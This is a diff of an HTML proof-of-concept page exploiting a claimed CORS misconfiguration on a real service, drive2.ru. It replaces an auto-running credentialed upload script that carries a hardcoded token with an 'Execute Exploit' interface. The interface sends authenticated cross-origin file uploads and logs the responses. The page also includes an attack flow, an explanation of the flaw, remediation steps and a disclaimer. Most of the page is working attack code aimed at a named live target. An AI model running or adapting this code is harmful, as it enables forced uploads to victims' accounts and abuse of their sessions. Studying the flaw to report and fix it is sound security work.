@@ -1,28 +1,611 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration POC - drive2.ru Upload Vulnerability</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 900px;
+            width: 100%;
+            padding: 40px;
+            overflow-y: auto;
+            max-height: 90vh;
+        }
+
+        header {
+            margin-bottom: 30px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 20px;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .warning-banner {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            color: #856404;
+        }
+
+        .vulnerability-info {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+
+        .vulnerability-info h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .info-item {
+            display: grid;
+            grid-template-columns: 150px 1fr;
+            gap: 15px;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .info-label {
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .info-value {
+            color: #666;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+
+        .section {
+            margin-bottom: 30px;
+        }
+
+        .section h2 {
+            color: #333;
+            font-size: 20px;
+            margin-bottom: 15px;
+            border-left: 4px solid #667eea;
+            padding-left: 15px;
+        }
+
+        .controls {
+            display: grid;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: grid;
+            grid-template-columns: 120px 1fr;
+            gap: 15px;
+            align-items: start;
+        }
+
+        label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="file"],
+        select {
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="file"]:focus,
+        select:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #5a6268;
+        }
+
+        .btn-danger {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c82333;
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .output-section {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .output-section h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        #output {
+            background: #282c34;
+            color: #61dafb;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            max-height: 400px;
+            overflow-y: auto;
+            word-break: break-all;
+            white-space: pre-wrap;
+        }
+
+        .status {
+            padding: 10px 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+
+        .exploit-steps {
+            list-style: none;
+            counter-reset: step-counter;
+        }
+
+        .exploit-steps li {
+            counter-increment: step-counter;
+            margin-bottom: 15px;
+            padding-left: 40px;
+            position: relative;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .exploit-steps li:before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #667eea;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dee2e6;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 22px;
+            }
+
+            .form-group {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                grid-template-columns: 1fr;
+            }
+
+            .info-item {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
 <body>
-<script>
-const form = new FormData();
+    <div class="container">
+        <header>
+            <h1>🔓 CORS Misconfiguration POC</h1>
+            <p class="subtitle">drive2.ru Upload Vulnerability Demonstration</p>
+        </header>
 
-form.append("_", "uploadSimple");
-form.append("type", "messengerimage");
-form.append(
-  "file",
-  new Blob(["test"], { type: "image/jpeg" }),
-  "poc.jpg"
-);
+        <div class="warning-banner">
+            ⚠️ <strong>Disclaimer:</strong> This POC is for authorized security testing only. Unauthorized access to computer systems is illegal. Use responsibly.
+        </div>
 
-fetch("https://upload-www.drive2.ru/_api/upload?.AMIG=.AMIG&token=AhgCSVVQVAjeuvYUvSOQCjDhAEAADNUKMMjAgABRT5XoNp_Sb3Vkc2Bn3PoAdNJrvma_", {
-  method: "POST",
-  credentials: "include",
-  body: form
-})
-.then(r => r.text())
-.then(data => {
-  console.log("Sensitive response:", data);
-  document.body.innerHTML = `<pre>${data}</pre>`;
-})
-.catch(console.error);
-</script>
+        <div class="vulnerability-info">
+            <h3>📋 Vulnerability Details</h3>
+            <div class="info-item">
+                <span class="info-label">Target:</span>
+                <span class="info-value">upload.drive2.ru/_api/upload</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Vulnerability Type:</span>
+                <span class="info-value">CORS Misconfiguration + Cross-Origin File Upload</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">HTTP Method:</span>
+                <span class="info-value">POST (multipart/form-data)</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Issue:</span>
+                <span class="info-value">Server accepts requests from any origin with credentials enabled (Access-Control-Allow-Credentials: true)</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Impact:</span>
+                <span class="info-value">Authenticated file uploads from malicious domains, account compromise, malware distribution</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>⚙️ Exploit Configuration</h2>
+            <div class="controls">
+                <div class="form-group">
+                    <label for="targetUrl">Target URL:</label>
+                    <input type="text" id="targetUrl" value="https://upload.drive2.ru/_api/upload" placeholder="Enter target endpoint">
+                </div>
+                <div class="form-group">
+                    <label for="token">Auth Token (Optional):</label>
+                    <input type="text" id="token" placeholder="e.g., AhgCSVVQVAjeuvYUvSOQCjDhAEAADNUKMMjAgABRT5XoNp_..." value="">
+                </div>
+                <div class="form-group">
+                    <label for="fileInput">Select File:</label>
+                    <input type="file" id="fileInput" accept="image/*">
+                </div>
+                <div class="form-group">
+                    <label for="uploadType">Upload Type:</label>
+                    <select id="uploadType">
+                        <option value="messengerimage">messengerimage</option>
+                        <option value="image">image</option>
+                        <option value="document">document</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-primary" onclick="executeExploit()">🚀 Execute Exploit</button>
+                <button class="btn-secondary" onclick="clearOutput()">🗑️ Clear Output</button>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📊 Exploit Execution</h2>
+            <div id="output"></div>
+            <div id="status"></div>
+        </div>
+
+        <div class="section">
+            <h2>🎯 Attack Flow</h2>
+            <ol class="exploit-steps">
+                <li><strong>Victim visits attacker's website</strong> (omarahmedalx.github.io) while logged into drive2.ru</li>
+                <li><strong>Malicious JavaScript executes</strong> in the victim's browser context</li>
+                <li><strong>Cross-origin request is sent</strong> to <code>upload.drive2.ru/_api/upload</code> with victim's cookies</li>
+                <li><strong>Server accepts the request</strong> because CORS headers are misconfigured (<code>Access-Control-Allow-Origin: *</code> or origin reflection)</li>
+                <li><strong>File is uploaded to victim's account</strong> with victim's authentication tokens</li>
+                <li><strong>Response leaks file metadata</strong> including upload ID and publicly accessible URLs</li>
+                <li><strong>Attacker can distribute malicious content</strong> using victim's account and drive2.ru's trusted domain</li>
+            </ol>
+        </div>
+
+        <div class="section">
+            <h2>💡 How It Works</h2>
+            <p style="margin-bottom: 15px; color: #555; line-height: 1.8;">
+                The vulnerability exists because the server at <code>upload.drive2.ru</code> is configured to:
+            </p>
+            <ol style="margin-left: 20px; color: #555; line-height: 1.8;">
+                <li><strong>Reflect the Origin header:</strong> Instead of maintaining a whitelist, the server mirrors back whatever origin sent the request</li>
+                <li><strong>Enable credential sharing:</strong> <code>Access-Control-Allow-Credentials: true</code> allows cookies/tokens to be sent cross-origin</li>
+                <li><strong>Skip CSRF protection:</strong> No token validation means any site can trigger uploads on behalf of authenticated users</li>
+                <li><strong>Accept cross-origin file uploads:</strong> No additional validation prevents unauthorized multipart requests</li>
+            </ol>
+        </div>
+
+        <div class="section">
+            <h2>🔐 Remediation</h2>
+            <ol style="margin-left: 20px; color: #555; line-height: 1.8; margin-bottom: 15px;">
+                <li><strong>Whitelist Origins:</strong> Define specific allowed origins instead of using wildcards or reflection</li>
+                <li><strong>Remove Unnecessary Credentials:</strong> Only enable <code>Access-Control-Allow-Credentials</code> when absolutely required</li>
+                <li><strong>Implement CSRF Tokens:</strong> Require server-generated tokens for state-changing operations</li>
+                <li><strong>Validate File Uploads:</strong> Verify MIME types, file size, and content server-side</li>
+                <li><strong>Use SameSite Cookies:</strong> Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on authentication cookies</li>
+            </ol>
+        </div>
+
+        <div class="footer">
+            <p>📝 <strong>Responsible Disclosure:</strong> Report vulnerabilities to the vendor's security team with a reasonable disclosure timeline (typically 90 days) before public disclosure.</p>
+            <p style="margin-top: 10px;">🔗 <strong>References:</strong> OWASP CORS, CWE-434 (Unrestricted Upload), CWE-749 (Exposed Dangerous Function)</p>
+        </div>
+    </div>
+
+    <script>
+        function logOutput(message, type = 'info') {
+            const outputDiv = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString('en-US', { 
+                hour12: false, 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit' 
+            });
+            outputDiv.textContent += `[${timestamp}] ${message}\n`;
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+
+        function updateStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('status');
+            statusDiv.className = `status ${type}`;
+            statusDiv.textContent = message;
+        }
+
+        function clearOutput() {
+            document.getElementById('output').textContent = '';
+            document.getElementById('status').textContent = '';
+        }
+
+        async function executeExploit() {
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            const token = document.getElementById('token').value.trim();
+            const fileInput = document.getElementById('fileInput');
+            const uploadType = document.getElementById('uploadType').value;
+
+            clearOutput();
+
+            if (!targetUrl) {
+                updateStatus('❌ Please enter a target URL', 'error');
+                return;
+            }
+
+            if (!fileInput.files.length) {
+                updateStatus('❌ Please select a file to upload', 'error');
+                return;
+            }
+
+            updateStatus('⏳ Preparing exploit...', 'loading');
+            logOutput('Starting CORS exploit execution');
+            logOutput(`Target: ${targetUrl}`);
+            logOutput(`File: ${fileInput.files[0].name}`);
+            logOutput(`Type: ${uploadType}`);
+            logOutput(`Token: ${token ? token.substring(0, 20) + '...' : 'Not provided'}`);
+            logOutput('---');
+
+            try {
+                const formData = new FormData();
+                formData.append('_', 'uploadSimple');
+                formData.append('type', uploadType);
+                formData.append('file', fileInput.files[0]);
+
+                let finalUrl = targetUrl;
+                if (token && !targetUrl.includes('token=')) {
+                    const separator = targetUrl.includes('?') ? '&' : '?';
+                    finalUrl = `${targetUrl}${separator}token=${encodeURIComponent(token)}`;
+                }
+
+                logOutput('Sending multipart/form-data request...');
+                logOutput(`Request URL: ${finalUrl}`);
+                logOutput('Headers:');
+                logOutput('  - Origin: ' + window.location.origin);
+                logOutput('  - Content-Type: multipart/form-data');
+                logOutput('  - Credentials: include');
+
+                updateStatus('⏳ Sending request...', 'loading');
+
+                const response = await fetch(finalUrl, {
+                    method: 'POST',
+                    credentials: 'include',
+                    body: formData,
+                    mode: 'cors'
+                });
+
+                logOutput('---');
+                logOutput(`HTTP Status: ${response.status} ${response.statusText}`);
+                logOutput('Response Headers:');
+                
+                const corsHeaders = {
+                    'access-control-allow-origin': response.headers.get('access-control-allow-origin'),
+                    'access-control-allow-credentials': response.headers.get('access-control-allow-credentials'),
+                    'access-control-expose-headers': response.headers.get('access-control-expose-headers'),
+                    'content-type': response.headers.get('content-type')
+                };
+
+                for (const [key, value] of Object.entries(corsHeaders)) {
+                    if (value) {
+                        logOutput(`  ${key}: ${value}`);
+                    }
+                }
+
+                const contentType = response.headers.get('content-type');
+                let responseData;
+
+                if (contentType && contentType.includes('application/json')) {
+                    responseData = await response.json();
+                } else {
+                    responseData = await response.text();
+                }
+
+                logOutput('---');
+                logOutput('Response Body:');
+                if (typeof responseData === 'object') {
+                    logOutput(JSON.stringify(responseData, null, 2));
+                } else {
+                    logOutput(responseData);
+                }
+
+                if (response.ok) {
+                    updateStatus('✅ Exploit executed successfully! File upload completed.', 'success');
+                    if (responseData.id) {
+                        logOutput(`\n✅ Upload ID: ${responseData.id}`);
+                    }
+                    if (responseData.images) {
+                        logOutput(`✅ File URLs obtained: ${responseData.images.length} versions generated`);
+                    }
+                } else {
+                    updateStatus(`⚠️ Request completed with status ${response.status}. Check output for details.`, 'info');
+                }
+
+            } catch (error) {
+                logOutput('---');
+                logOutput(`❌ Error: ${error.message}`);
+                logOutput(`Error Type: ${error.name}`);
+                updateStatus(`❌ Exploit failed: ${error.message}`, 'error');
+                logOutput('\nPossible causes:');
+                logOutput('  - Target server may not have CORS enabled for this origin');
+                logOutput('  - Server may have implemented proper CORS restrictions');
+                logOutput('  - Network error or server unreachable');
+                logOutput('  - File upload may have failed due to validation');
+            }
+        }
+
+        // Initialize
+        window.addEventListener('load', function() {
+            logOutput('CORS Exploit POC loaded successfully');
+            logOutput('Select a file and click "Execute Exploit" to begin');
+            logOutput('---');
+        });
+    </script>
 </body>
 </html>
